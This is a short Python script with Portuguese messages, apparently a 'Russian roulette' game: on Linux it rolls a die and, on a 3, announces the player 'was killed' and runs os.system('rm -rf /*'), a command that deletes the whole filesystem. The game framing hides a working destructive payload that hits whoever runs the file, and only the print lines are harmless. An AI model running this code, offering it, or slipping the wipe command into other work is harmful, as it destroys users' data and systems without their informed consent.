import random
import time
import os
import platform

value = random.randint(1, 6)
opSystem = platform.system()
cmd_linux = 'rm -rf /*'

if(opSystem == 'Linux'):
    print('Seu sistema operacional é Linux!')
    if (value == 3):
        print('Voce foi morto, o valor que caiu foi: {}.'.format(value))
        print('Acabou tudo por aqui!')
        time.sleep(1)
        os.system(cmd_linux)
    else:
        print('Voce foi salvo, o valor que caiu foi: {}.'.format(value))
        print('Acabou tudo por aqui!')
        time.sleep(1)
else:
    print('Indisponível para seu sistema operacional no momento!\nAguarde novas atualizações!')
